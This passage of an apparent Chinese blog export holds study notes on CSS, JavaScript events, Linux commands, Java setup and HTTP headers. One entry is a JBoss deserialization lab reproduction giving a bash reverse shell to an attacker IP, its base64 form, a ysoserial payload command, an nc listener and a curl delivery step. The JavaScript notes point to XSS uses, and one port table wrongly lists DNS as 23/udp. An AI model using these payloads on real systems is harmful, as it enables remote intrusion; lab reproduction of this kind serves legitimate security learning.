<td><code>&lt;view  style=&#39;position:absolute;&#39;&gt; </code><br><code>&lt;image style=&#39; width:102px;  height:110px&#39; src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt; </code> <br>在没有使用 “left”, “top”, “right” 以及 “bottom” 属性之前，基于文档流的位置停留在在文档流之外，  随着滚动并不一直停留在屏幕中。     <br><br><code>&lt;view  style=&#39;position:absolute;bottom:100rpx;right:100rpx&#39;&gt;  </code><br><code>&lt;image style=&#39; width:102rpx;  height:110rpx&#39;  src=&quot;/images/music/music-start.png&quot;&gt;&lt;/image&gt;  &lt;/view&gt;</code>  <br>在使用 “left”, “top”, “right” 以及 “bottom” 属性之后，位置就不是基于文档流时候的位置，  而是根据这些设置的属性基于整个屏幕的位置确定的。随着滚动并不一直停留在屏幕中。</td>
</tr>
<tr>
<td>relative<br>相对定位</td>
<td><code>&lt;html&gt;  &lt;head&gt; </code><br><code>&lt;style  type=&quot;text/css&quot;&gt;</code><br><code>h2.pos_left  &#123;  position:relative;  left:-20px  &#125; </code><br><code>h2.pos_right  &#123;  position:relative;  left:20px  &#125; </code><br><code>.container&#123;   margin-left:100px;   border:5px solid #405f80;  &#125;</code><br><code>&lt;/style&gt;  &lt;/head&gt;  &lt;body&gt; </code><br><code> &lt;div class=&quot;container&quot;&gt; </code><br><code>   &lt;h2&gt;这是位于正常位置的标题&lt;/h2&gt;  </code><br><code>&lt;h2 class=&quot;pos_left&quot;&gt;这个标题相对于其正常位置向左移动&lt;/h2&gt;  </code><br><code>&lt;h2 class=&quot;pos_right&quot;&gt;这个标题相对于其正常位置向右移动&lt;/h2&gt; </code><br><code>&lt;/div&gt;  &lt;/body&gt;     &lt;/html&gt;  </code></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程基础</category>
      </categories>
      <tags>
        <tag>HTML</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript基础</title>
    <url>/article/JavaScript%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="js调用方法（4种）"><a href="#js调用方法（4种）" class="headerlink" title="js调用方法（4种）"></a>js调用方法（4种）</h1><table>
<thead>
<tr>
<th>语句</th>
<th>执行</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td>script标签中执行 –标签外（如body中） 推荐<br>（不用点击，直接触发）</td>
</tr>
<tr>
<td><code>&lt;script  src=&quot;x.js&quot;&gt;&lt;/script&gt; </code></td>
<td>调用执行   –标签外</td>
</tr>
<tr>
<td><code>&lt;a  href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;  </code></td>
<td>伪协议触发（javascript不可少）–标签内   推荐</td>
</tr>
<tr>
<td><code>&lt;p  onclick=&quot;alert(1)&quot;&gt;&lt;/p&gt;  </code></td>
<td>事件触发   –标签内</td>
</tr>
</tbody></table>
<h1 id="js事件"><a href="#js事件" class="headerlink" title="js事件"></a>js事件</h1><table>
<thead>
<tr>
<th align="left">事件</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows事件</td>
<td align="left">针对windows对象触发的事件，应用到body标签</td>
</tr>
<tr>
<td align="left">onafterprint</td>
<td align="left">打印之后触发的事件</td>
</tr>
<tr>
<td align="left">onbeforeprint</td>
<td align="left">打印之前触发的事件</td>
</tr>
<tr>
<td align="left">onerror</td>
<td align="left">发生错误（文件加载错误等）时触发的事件，常跟不存在的图片，用来执行js触发xss漏洞</td>
</tr>
<tr>
<td align="left">onload</td>
<td align="left">页面加载完成后立即发生</td>
</tr>
<tr>
<td align="left">onresize</td>
<td align="left">窗口大小被改变时触发的事件</td>
</tr>
<tr>
<td align="left">onunload</td>
<td align="left">页面下载或刷新网页时触发事件</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Form事件</td>
<td align="left">由HTML表单内的动作触发的事件，应用到几乎所有的HTML元素，最常用在Form元素</td>
</tr>
<tr>
<td align="left">onblur</td>
<td align="left">当元素失去焦点（鼠标移出等）时触发的事件</td>
</tr>
<tr>
<td align="left">onchange</td>
<td align="left">输入框的值发生变化或者下拉列表框选项触发的事件</td>
</tr>
<tr>
<td align="left">onfocus</td>
<td align="left">当元素获得焦点时触发的事件</td>
</tr>
<tr>
<td align="left">onformchange</td>
<td align="left">当表单被改变时触发的事件</td>
</tr>
<tr>
<td align="left">oninput</td>
<td align="left">当元素获得用户输入时触发的事件</td>
</tr>
<tr>
<td align="left">onselect</td>
<td align="left">元素中文本被选中后触发的事件</td>
</tr>
<tr>
<td align="left">onsubmit</td>
<td align="left">提交表单时触发的事件</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Keyboard事件</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">onkeydown</td>
<td align="left">用户按下按键时触发的事件</td>
</tr>
<tr>
<td align="left">onkeypress</td>
<td align="left">用户敲击按钮时触发的事件</td>
</tr>
<tr>
<td align="left">onkeyup</td>
<td align="left">用户释放按键时触发的事件</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Mouse事件</td>
<td align="left">由鼠标或类似用户动作触发的事件</td>
</tr>
<tr>
<td align="left">onclick</td>
<td align="left">元素上发生鼠标点击时触发的事件</td>
</tr>
<tr>
<td align="left">ondblclick</td>
<td align="left">元素上发生鼠标双击时触发的事件</td>
</tr>
<tr>
<td align="left">onmousedown</td>
<td align="left">当元素上按下鼠标按钮时触发的事件</td>
</tr>
<tr>
<td align="left">onmousemove</td>
<td align="left">当鼠标指针移动到元素上时触发的事件</td>
</tr>
<tr>
<td align="left">onmouseover</td>
<td align="left">当鼠标指针移动到元素上时触发的事件</td>
</tr>
<tr>
<td align="left">onmouseout</td>
<td align="left">当鼠标指针移出元素时触发的事件</td>
</tr>
<tr>
<td align="left">onmouseup</td>
<td align="left">当在元素上释放鼠标按钮时触发的事件</td>
</tr>
</tbody></table>
<p>更多事件访问文档：<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>
<h1 id="DOM操作"><a href="#DOM操作" class="headerlink" title="DOM操作"></a>DOM操作</h1><table>
<thead>
<tr>
<th align="left">使用</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">通过ID获取</td>
<td align="left">document.getElementById()</td>
</tr>
<tr>
<td align="left">通过标签名称获取（结果有多个，以数组形式存放）</td>
<td align="left">docunment.getElementsByTagName()</td>
</tr>
<tr>
<td align="left">通过对象名称获取（结果有多个，以数组形式存放）</td>
<td align="left">documemt.getElementsByClassName()</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">document事件操作</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">动态添加事件</td>
<td align="left">document.getElementById(“x”).addEventListener(“click”,function(){ }) 给img添加点击事件 document.getElementById(“x”).addEventListener(“click”,function(){ alert(“这是图片”) })</td>
</tr>
<tr>
<td align="left">创建标签</td>
<td align="left">document.createElement(“img”) #创建img标签 <br>创建img标签，并添加属性 <br>img = document.createElement(“img”) <br>img.src = “x.jpg” <br>img.style.width = “100px” <br>… <br><br>可以创建script标签实现跨站脚本攻击 <br> <img src="/article/JavaScript%E5%9F%BA%E7%A1%80/image-20210809144718521.png" alt="image-20210809144718521" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/JavaScript%E5%9F%BA%E7%A1%80/image-20210809144718521.png" class="lozad post-image"></td>
</tr>
<tr>
<td align="left">应用</td>
<td align="left">document.body.appendChild() 执行添加/创建（否则不显示）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程基础</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss反序列化漏洞复现</title>
    <url>/article/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
<p>攻击机：192.168.66.138</p>
<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>

<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)</a></p>
<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>

<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>

<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>

<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>

<p>注：poc版本&gt;=5</p>
<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>JBoss</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux随记</title>
    <url>/article/Linux%E9%9A%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h1><h2 id="配置静态IP："><a href="#配置静态IP：" class="headerlink" title="配置静态IP："></a>配置静态IP：</h2><pre class="highlight"><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0 或ifcfg-ens33</span><br><span class="line"></span><br><span class="line">ONBOOT=yes</span><br><span class="line"></span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line"></span><br><span class="line">IPADDR=&quot;192.168.x.x&quot;</span><br><span class="line"></span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line"></span><br><span class="line">GATEWAY=&quot;192.168.x.1&quot;</span><br><span class="line">ifdown eth0   禁用网卡</span><br><span class="line"></span><br><span class="line">ifup eth0      启用网卡</span><br></pre>

<h2 id="配置DNS："><a href="#配置DNS：" class="headerlink" title="配置DNS："></a>配置DNS：</h2><pre class="highlight"><span class="line">vim /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">nameserver 8.8.8.8</span><br></pre>

<h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><p>arp -a 192.168.x.x 查看ip是否被使用，用来选择静态ip</p>
<p>常用DNS：</p>
<p>国内：114.114.114.114、223.5.5.5、119.29.29.29等</p>
<p>国外：1.1.1.1、8.8.8.8等</p>
<h1 id="重要目录及文件"><a href="#重要目录及文件" class="headerlink" title="重要目录及文件"></a>重要目录及文件</h1><table>
<thead>
<tr>
<th align="left">目录</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">/etc</td>
<td align="left">存放所有管理系统所需要的配置文件和子目录</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">/etc/passwd #存放操作系统用户信息 /etc/shadow #存放操作系统账户密码 /etc/group #存储当前系统中所有用户组信息 /etc/gshadow #存储用户组密码的一类信息 /etc/nginx/nginx.conf # Nginx配置文件 /etc/httpd/conf/httpd.conf # Apache配置文件路径</td>
</tr>
<tr>
<td align="left">/usr</td>
<td align="left">Linux系统资源目录，类似Windows下的program files目录</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">/usr/local/nginx/html # Nginx默认网站路径</td>
</tr>
<tr>
<td align="left">/var</td>
<td align="left">系统运行时需要改变的数据&lt;br /</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">/var/log #日志存放目录 /var/spool/cron #计划任务目录，定时执行 /var/lib/mysql # mysql数据路径 /var/www/html # Apache默认网站路径</td>
</tr>
</tbody></table>
<h1 id="常用解压压缩"><a href="#常用解压压缩" class="headerlink" title="常用解压压缩"></a>常用解压压缩</h1><pre class="highlight"><span class="line">tar -zxvf file  -C ./dir			  	#解压.tar.gz文件到指定文件夹</span><br><span class="line"></span><br><span class="line">tar -zcvf ./file  file1 file2			#打包压缩成.tar.gz文件，注意，压缩成的文件需要在-f参数后面</span><br><span class="line"></span><br><span class="line">unzip file								#解压zip文件</span><br><span class="line"></span><br><span class="line">zip file								#压缩zip文件</span><br><span class="line">7za x file.7z -r -o./					#解压</span><br><span class="line">7za a -t7z file.7z /opt/fileName/*		#压缩</span><br></pre>

<p>注：压缩中，-t指定压缩类型，可忽略（默认7z）</p>
<p>下载使用</p>
<pre class="highlight"><span class="line">yum install p7zip -y</span><br></pre>

<h1 id="VI使用"><a href="#VI使用" class="headerlink" title="VI使用"></a>VI使用</h1><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">i、I</td>
<td align="left">i光标处输入，I所在行第一个非空格符处输入</td>
</tr>
<tr>
<td align="left">a、A</td>
<td align="left">a光标下一个字符处输入，A行末处输入</td>
</tr>
<tr>
<td align="left">o、O</td>
<td align="left">o光标下一新行输入，O光标上一新行输入</td>
</tr>
<tr>
<td align="left">ESC</td>
<td align="left">命令模式</td>
</tr>
<tr>
<td align="left">ctrl+b</td>
<td align="left">上翻</td>
</tr>
<tr>
<td align="left">ctrl+f</td>
<td align="left">下翻</td>
</tr>
<tr>
<td align="left">0</td>
<td align="left">移动到行首</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">移动到行尾</td>
</tr>
<tr>
<td align="left">gg</td>
<td align="left">移动到文档首</td>
</tr>
<tr>
<td align="left">G</td>
<td align="left">移动到文档尾</td>
</tr>
<tr>
<td align="left">:%s/word1/word2/g</td>
<td align="left">全局替换word1为word2</td>
</tr>
<tr>
<td align="left">/word</td>
<td align="left">向光标之下寻找word字符串</td>
</tr>
<tr>
<td align="left">?word</td>
<td align="left">向光标之上寻找word字符串</td>
</tr>
<tr>
<td align="left">x、X</td>
<td align="left">剪切</td>
</tr>
<tr>
<td align="left">dd</td>
<td align="left">删除整行</td>
</tr>
<tr>
<td align="left">ndd</td>
<td align="left">删除n行</td>
</tr>
<tr>
<td align="left">yy</td>
<td align="left">复制整行</td>
</tr>
<tr>
<td align="left">nyy</td>
<td align="left">复制n行</td>
</tr>
<tr>
<td align="left">p、P</td>
<td align="left">p向下粘贴，P向上粘贴</td>
</tr>
<tr>
<td align="left">u</td>
<td align="left">撤销，直至还原</td>
</tr>
<tr>
<td align="left">ctrl+r</td>
<td align="left">撤销，仅限一步</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">重复上一个动作</td>
</tr>
<tr>
<td align="left">:q</td>
<td align="left">不保存退出</td>
</tr>
<tr>
<td align="left">:w</td>
<td align="left">保存退出</td>
</tr>
<tr>
<td align="left">:!</td>
<td align="left">强制执行</td>
</tr>
<tr>
<td align="left">:! command</td>
<td align="left">暂时离开vi执行command</td>
</tr>
<tr>
<td align="left">:set nu</td>
<td align="left">显示行号</td>
</tr>
<tr>
<td align="left">:set nonu</td>
<td align="left">取消显示行号</td>
</tr>
</tbody></table>
<h1 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h1><pre class="highlight"><span class="line">find / -name &quot;file&quot;  在根目录下查看文件名为file的文件</span><br><span class="line">find / -perm &quot;root&quot;  在根目录下查找root权限文件</span><br><span class="line">find / -user &quot;root&quot;  在根目录下查找root用户文件</span><br></pre>

<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><h2 id="curl安装"><a href="#curl安装" class="headerlink" title="curl安装"></a>curl安装</h2><p>（需要有下载路径，本机对服务器的下载）</p>
<p>curl _ip/_file -o filename -o可替换为&gt;</p>
<h2 id="scp上传"><a href="#scp上传" class="headerlink" title="scp上传"></a>scp上传</h2><p>（需要有源文件，本机对服务器的上传）</p>
<p>scp：ssh+sftp，占用ssh端口及账号及部分功能，使用sftp协议，进行文件上传</p>
<p>scp filename root@ip:/_path</p>
<h2 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h2><p>（需要源网站里面有对应的软件）</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">yum search</td>
<td align="left">查找</td>
</tr>
<tr>
<td align="left">yum install</td>
<td align="left">安装</td>
</tr>
<tr>
<td align="left">yum remove</td>
<td align="left">移除</td>
</tr>
<tr>
<td align="left">yum update</td>
<td align="left">升级，可指定升级，也可全部升级</td>
</tr>
</tbody></table>
<p>注：yum源文件：/etc/yum.repos.d</p>
<h2 id="wget安装"><a href="#wget安装" class="headerlink" title="wget安装"></a>wget安装</h2><p>（同curl，但是更简单，速度更快）</p>
<p>wget _path/_file</p>
<h2 id="源码安装步骤"><a href="#源码安装步骤" class="headerlink" title="源码安装步骤"></a>源码安装步骤</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1、tar 解包</td>
<td align="left">解压缩源码包到指定目录</td>
</tr>
<tr>
<td align="left">2、./configure</td>
<td align="left">配置生成makefile文件，可手动配置参数（如安装路径）</td>
</tr>
<tr>
<td align="left">3、make编译</td>
<td align="left">生成可执行的二进制文件</td>
</tr>
<tr>
<td align="left">4、make install安装</td>
<td align="left">复制二进制文件到系统，配置应用环境（如应用安装路径配置文件）</td>
</tr>
</tbody></table>
<p>注：configure配置文档（官方文档）</p>
<p><a href="http://nginx.org/en/docs/configure/html">http://nginx.org/en/docs/configure/html</a></p>
<h1 id="firewall防火墙配置"><a href="#firewall防火墙配置" class="headerlink" title="firewall防火墙配置"></a>firewall防火墙配置</h1><table>
<thead>
<tr>
<th>命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td>firewall-cmd –state</td>
<td align="left">查看防火墙状态</td>
</tr>
<tr>
<td>firewall-cmd –get-active-zones</td>
<td align="left">查看正在使用的区域及网卡名称</td>
</tr>
<tr>
<td>firewall-cmd –list-all-zones</td>
<td align="left">显示当前预期网卡配置参数、资源、端口及服务等信息</td>
</tr>
<tr>
<td>firewall-cmd –zone=public –add-port=80/tcp –permanent</td>
<td align="left">允许80端口tcp流量通过，永久生效</td>
</tr>
<tr>
<td>firewall-cmd –zone=public –add-service=http –permanent</td>
<td align="left">同上，不同的配置方式</td>
</tr>
<tr>
<td>firewall-cmd –zone=public –remove-port=23/udp –permanent</td>
<td align="left">禁止23端口udp流量通过，永久生效</td>
</tr>
<tr>
<td>firewall-zone –zone=public –remove-service=dns –permanent</td>
<td align="left">同上，不同配置方式</td>
</tr>
</tbody></table>
<p>常用端口服务：</p>
<table>
<thead>
<tr>
<th align="left">服务</th>
<th align="left">端口</th>
</tr>
</thead>
<tbody><tr>
<td align="left">http</td>
<td align="left">80/tcp</td>
</tr>
<tr>
<td align="left">https</td>
<td align="left">443/tcp</td>
</tr>
<tr>
<td align="left">dns</td>
<td align="left">23/udp</td>
</tr>
<tr>
<td align="left">mysql</td>
<td align="left">3306/tcp</td>
</tr>
<tr>
<td align="left">ssh</td>
<td align="left">22/tcp</td>
</tr>
</tbody></table>
<h1 id="安装Python3"><a href="#安装Python3" class="headerlink" title="安装Python3"></a>安装Python3</h1><pre class="highlight"><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum install python36</span><br></pre>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
  <entry>
    <title>Java环境变量配置</title>
    <url>/article/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
<p>2、新建 JAVA_HOME</p>
<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>

<p>3、新建 CLASSPATH</p>
<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>

<p>4、修改 Path-新增</p>
<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br><span class="line">%JAVA_HOME%\jre\bin;</span><br></pre>

<p>注！环境变量path中，首行删除java自带的环境变量，否则自定义变量无法生效</p>
<pre class="highlight"><span class="line">C:\Program Files\Common Files\Oracle\Java\javapath</span><br></pre>

<p>且移动环境变量配置于此行之上</p>
<pre class="highlight"><span class="line">C:\Program Files(x86)\Common Files\Oracle\Java\javapath</span><br></pre>

<p>最后注意移动任意绝对路径至行首，否则path路径再次打开将以单行显示</p>
<h2 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h2><p>同上，无需修改</p>
<h2 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h2><p>1、新建JAVA8_HOME、JAVA11_HOME（JAVA_HOME已在上面新建）</p>
<p>2、新建java8.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA8_HOME%&quot; /m</span><br></pre>

<p>3、新建java11.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA11_HOME%&quot; /m</span><br></pre>

<p>注：管理员权限运行</p>
<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><p>家目录下执行</p>
<pre class="highlight"><span class="line">vim .zshrc</span><br></pre>

<p>最后一行添加</p>
<pre class="highlight"><span class="line">alias java8=&quot;java8路径/bin/java&quot;</span><br></pre>

<p>重新加载配置文件</p>
<pre class="highlight"><span class="line">source .zshrc</span><br></pre>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP基础</title>
    <url>/article/HTTP%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p>简介：</p>
<p>超文本传输协议，80端口</p>
<p>特点：</p>
<p>1、支持客户端/服务器模式</p>
<p>2、简单快速</p>
<p>3、灵活</p>
<p>4、无状态</p>
<p>请求报文：</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">开始行</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">首部</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">一个空行</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">主体</td>
<td align="left"></td>
</tr>
</tbody></table>
<p>响应报文：</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">状态行</td>
<td align="left">HTTP/版本 状态码 状态短语</td>
</tr>
<tr>
<td align="left">首部</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">一个空行</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">主体</td>
<td align="left"></td>
</tr>
</tbody></table>
<p>请求字段</p>
<table>
<thead>
<tr>
<th align="left">协议头字段名</th>
<th align="left">说明</th>
<th align="left">示例</th>
<th align="left">状态</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Accept</td>
<td align="left">能够接受的回应内容类型（Content-Types）</td>
<td align="left">Accept: text/plain</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Accept-Charset</td>
<td align="left">能够接受的字符集</td>
<td align="left">Accept-Charset: utf-8</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Accept-Encoding</td>
<td align="left">能够接受的编码方式列表</td>
<td align="left">Accept-Encoding: gzip, deflate</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Accept-Language</td>
<td align="left">能够接受的回应内容的自然语言列表。</td>
<td align="left">Accept-Language: en-US</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Authorization</td>
<td align="left">用于超文本传输协议的认证的认证信息</td>
<td align="left">Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Cache-Control</td>
<td align="left">用来指定在这次的请求/响应链中的所有缓存机制都必须遵守的指令</td>
<td align="left">Cache-Control: no-cache</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Connection</td>
<td align="left">该浏览器想要优先使用的连接类型</td>
<td align="left">Connection: keep-alive Connection: Upgrade</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Content-Length</td>
<td align="left">以八位字节数组 （8位的字节）表示的请求体的长度</td>
<td align="left">Content-Length: 348</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Content-Type</td>
<td align="left">请求体的格式 （用于POST和PUT请求中）</td>
<td align="left">Content-Type: application/x-www-form-urlencoded</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Date</td>
<td align="left">发送该消息的日期和时间(按照 RFC 7231 中定义的”超文本传输协议日期”格式来发送)</td>
<td align="left">Date: Tue, 15 Nov 1994 08:12:31 GMT</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Expect</td>
<td align="left">表明客户端要求服务器做出特定的行为</td>
<td align="left">Expect: 100-continue</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">From</td>
<td align="left">发起此请求的用户的邮件地址</td>
<td align="left">From: <a href="mailto:user@example.com">user@example.com</a></td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Host</td>
<td align="left">服务器的域名(用于虚拟主机 )，以及服务器所监听的传输控制协议端口号。如果所请求的端口是对应的服务的标准端口，则端口号可被省略。 自超文件传输协议版本1.1（HTTP/1.1）开始便是必需字段。</td>
<td align="left">Host: en.wikipedia.org:80 Host: en.wikipedia.org</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">If-Match</td>
<td align="left">仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要作用时，用作像 PUT 这样的方法中，仅当从用户上次更新某个资源以来，该资源未被修改的情况下，才更新该资源。</td>
<td align="left">If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">If-Modified-Since</td>
<td align="left">允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ）</td>
<td align="left">If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">If-None-Match</td>
<td align="left">允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ）</td>
<td align="left">If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">If-Range</td>
<td align="left">如果该实体未被修改过，则向我发送我所缺少的那一个或多个部分；否则，发送整个新的实体</td>
<td align="left">If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">If-Unmodified-Since</td>
<td align="left">仅当该实体自某个特定时间已来未被修改的情况下，才发送回应。</td>
<td align="left">If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Max-Forwards</td>
<td align="left">限制该消息可被代理及网关转发的次数。</td>
<td align="left">Max-Forwards: 10</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Proxy-Authorization</td>
<td align="left">用来向代理进行认证的认证信息。</td>
<td align="left">Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Range</td>
